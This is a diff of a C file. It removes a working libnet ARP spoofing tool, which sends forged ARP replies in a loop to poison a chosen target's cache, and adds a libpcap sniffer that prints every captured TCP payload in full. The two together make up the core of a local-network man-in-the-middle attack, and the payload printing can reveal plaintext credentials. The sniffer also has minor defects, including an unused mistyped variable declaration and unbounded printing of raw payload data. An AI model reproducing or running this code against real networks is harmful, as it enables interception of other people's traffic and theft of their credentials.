@@ -1,124 +1,139 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <libnet.h>
-#include <unistd.h>
+#include <pcap.h>
+#include <sys/time.h>
 
-void usage(){
-        printf("Extracting commandline arguments failed\n");
-        printf("Please refer to usage");
-        printf("arpspoof [targetIP] [targetMAC] [sourceIP] [sourceMAC]\n");
-        exit(EXIT_FAILURE);
-}
+/* ethernet headers are always exactly 14 bytes [1] */
+#define SIZE_ETHERNET 14
+
+/* Ethernet addresses are 6 bytes */
+#define ETHER_ADDR_LEN  6
+
+/* Ethernet header */
+struct sniff_ethernet {
+        u_char  ether_dhost[ETHER_ADDR_LEN];    /* destination host address */
+        u_char  ether_shost[ETHER_ADDR_LEN];    /* source host address */
+        u_short ether_type;                     /* IP? ARP? RARP? etc */
+};
+
+/* IP header */
+struct sniff_ip {
+        u_char  ip_vhl;                 /* version << 4 | header length >> 2 */
+        u_char  ip_tos;                 /* type of service */
+        u_short ip_len;                 /* total length */
+        u_short ip_id;                  /* identification */
+        u_short ip_off;                 /* fragment offset field */
+        #define IP_RF 0x8000            /* reserved fragment flag */
+        #define IP_DF 0x4000            /* dont fragment flag */
+        #define IP_MF 0x2000            /* more fragments flag */
+        #define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
+        u_char  ip_ttl;                 /* time to live */
+        u_char  ip_p;                   /* protocol */
+        u_short ip_sum;                 /* checksum */
+        struct  in_addr ip_src,ip_dst;  /* source and dest address */
+};
+#define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)
+#define IP_V(ip)                (((ip)->ip_vhl) >> 4)
+
+/* TCP header */
+typedef u_int tcp_seq;
+
+struct sniff_tcp {
+        u_short th_sport;               /* source port */
+        u_short th_dport;               /* destination port */
+        tcp_seq th_seq;                 /* sequence number */
+        tcp_seq th_ack;                 /* acknowledgement number */
+        u_char  th_offx2;               /* data offset, rsvd */
+#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
+        u_char  th_flags;
+        #define TH_FIN  0x01
+        #define TH_SYN  0x02
+        #define TH_RST  0x04
+        #define TH_PUSH 0x08
+        #define TH_ACK  0x10
+        #define TH_URG  0x20
+        #define TH_ECE  0x40
+        #define TH_CWR  0x80
+        #define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
+        u_short th_win;                 /* window */
+        u_short th_sum;                 /* checksum */
+        u_short th_urp;                 /* urgent pointer */
+};
+
+
+// Handle packet callback
+void onPacket(u_char *arg, const struct pcap_pkthdr* pkthdr, const u_char* packet){
+
+        const struct sniff_ethernet *ethernet;                          // Ethernet Header
+        const struct sniff_ip *ip;                                      // IP Header
+        const struct sniff_tcp *tcp;                                    // TCP header
+        const char *payload;                                            // Packet payload
+
+        u_int size_ip;
+        u_int size_tcp;
+
+        printf("Packet Received:\n");
+
+        ethernet = (struct sniff_ethernet *)(packet);
+        ip = (struct sniff_ip *)(packet + SIZE_ETHERNET);
+        size_ip = IP_HL(ip) * 4;
+        if(size_ip < 20){
+                printf("Invalid IP header length: %u bytes\n", size_ip);
+                return;
+        };
+        tcp = (struct sniff_tcp *)(packet + SIZE_ETHERNET + size_ip);
+        size_tcp = TH_OFF(tcp) * 4;
+        if(size_tcp < 20){
+                printf("Invalid TCP header length: %u bytes\n", size_tcp);
+                return;
+        };
+        payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
+        char *ip_src, ip_dst;
+        printf("%s", payload);
+        //printf("Length: %u", pkthdr->caplen);
+        //printf("Length: %u\r\r%s  \n", pkthdr->caplen, ip->ip_p);
+        //printf("%d", (ip->ip_src).s_addr);
+};
+
 
 int main(int argc, char **argv){
+        char *dev, err_buf[PCAP_ERRBUF_SIZE];
+        pcap_t *handle;
+        pcap_if_t *alldevs;
 
-        char *local_ip_p = "192.168.1.27"; // Local IP
-        char *local_mac_p = "LOCAL MAC ADDRESS";
-        uint32_t local_ip;                      // Local IP address
-        uint8_t *local_mac;                     // local MAC address
-        int A_length;
+        // Look up network device
 
-        libnet_ptag_t t_arp;                    // ARP packet to target ptag
-        libnet_ptag_t g_arp;                    // ARP packet to source ptag
-
-        libnet_ptag_t t_eth;                    // Ethernet packet to target ptag
-        libnet_ptag_t g_eth;                    // Ethernet packet to source ptag
-
-        uint32_t target_ip;                     // Target IP address
-        uint8_t *target_mac;                    // Target MAC address
-        uint32_t source_ip;                     // Source IP address
-        uint8_t *source_mac;                    // Source MAC address
-        int T_length, G_length;
-
-
-        if(argc != 5){
-                usage();
+        if(pcap_findalldevs(&alldevs, err_buf) == -1){
+                fprintf(stderr, "Unable to find network device: %s\n", err_buf);
+                exit(EXIT_FAILURE);
         };
+        dev = (char *) (alldevs->name);
 
-        libnet_t *l; // Libnet context
-        char err_buf[LIBNET_ERRBUF_SIZE];
+        printf("Listening on %s\n", dev);
 
-        l = libnet_init(LIBNET_LINK, NULL, err_buf);
-
-        // If initialization failed
-        if(l == NULL){
-                fprintf(stderr, "libnet_init() failed: %s\n", err_buf);
+        // Open device for sniffing
+        handle = pcap_open_live(dev, 65535, 0, 1000, err_buf);
+        if(handle == NULL){
+                fprintf(stderr, "Unable to open device %s: %s\n", dev, err_buf);
                 exit(EXIT_FAILURE);
         };
 
-        // Extracting commandline arguments and Parsing
-        printf("Parsing user input\n");
-        target_ip = libnet_name2addr4(l, argv[1], LIBNET_DONT_RESOLVE);
-        target_mac = libnet_hex_aton(argv[2], &T_length);
-        source_ip = libnet_name2addr4(l, argv[3], LIBNET_DONT_RESOLVE);
-        source_mac= libnet_hex_aton(argv[4], &G_length);
-        if(target_ip == -1 || target_mac == NULL || source_ip == -1 || source_mac == NULL){
-                printf("Failed to parse user input\n");
+        // Check for link-layer header compatibiliy
+        if(pcap_datalink(handle) != DLT_EN10MB){
+                fprintf(stderr, "Device %s doesn't provide Ethernet headers - not supported\n", dev);
                 exit(EXIT_FAILURE);
         };
 
-        // Fetch local IP and MAC addresses
-        printf("Fetching Local IP address\n");
-        local_ip = libnet_name2addr4(l, local_ip_p, LIBNET_DONT_RESOLVE);
-        printf("Fetching Local MAC address\n");
-        local_mac = libnet_hex_aton(local_mac_p, &A_length);
-        if(local_ip == -1 || local_mac == NULL){
-                fprintf(stderr, "Failed to fetch local IP and/or MAC adresses: %s\n", libnet_geterror(l));
+
+        // Capture packets
+        printf("Starting packet sniffing\n");
+        if((pcap_loop(handle, -1, onPacket, NULL)) == -1){
+                fprintf(stderr, "Unable to capture packets on %s: %s\n", dev, err_buf);
                 exit(EXIT_FAILURE);
-        };
-
-        while(1){
-                // Build ARP packets
-                printf("Building ARP headers\n");
-                // >> To Target
-                t_arp = libnet_autobuild_arp(
-                                                ARPOP_REPLY,                                    // ARP operation (REPLY)
-                                                source_mac,                                     // Local MAC address
-                                                (uint8_t *) &source_ip,                         // Source IP address
-                                                target_mac,                                     // Target IP address
-                                                (uint8_t *) &target_ip,                         // Target MAC address
-                                                l                                               // libnet Context
-                                        );
-                if(t_arp == -1){
-                        fprintf(stderr, "Unable to build ARP header (to Target): %s\n", libnet_geterror(l));
-                        exit(EXIT_FAILURE);
-                };
-
-                // Build Ethernet packets
-                printf("Building Ethernet headers\n");
-                // >> To Target
-                t_eth = libnet_build_ethernet(
-                                                target_mac,                                     // Target MAC address
-                                                (uint8_t *) source_mac,                         // Local MAC address
-                                                ETHERTYPE_ARP,                                  // Type of upper protocol (ARP)
-                                                NULL,                                           // Payload
-                                                0,                                              // Payload length
-                                                l,                                              // Libnet Context
-                                                0                                               // Ptag to build packet
-                                        );
-                if(t_eth == -1){
-                        fprintf(stderr, "Unable to build ETHERNET header (to Target): %s\n", libnet_geterror(l));
-                        exit(EXIT_FAILURE);
-                };
-
-                // Write Packets
-                printf("Writing packets...\n");
-                if ((libnet_write(l)) == -1){
-                        fprintf(stderr, "Unable to send packet: %s\n", libnet_geterror(l));
-                        exit(EXIT_FAILURE);
-                };
-
-                // Timeout
-                sleep(5);
-
         }
 
-        // Clean & Exit
-        printf("Quitting...\n");
-        free(target_mac);
-        free(source_mac);
-
-        libnet_destroy(l);
-
+        // Closing sniffing
+        pcap_close(handle);
         return 0;
+
 };
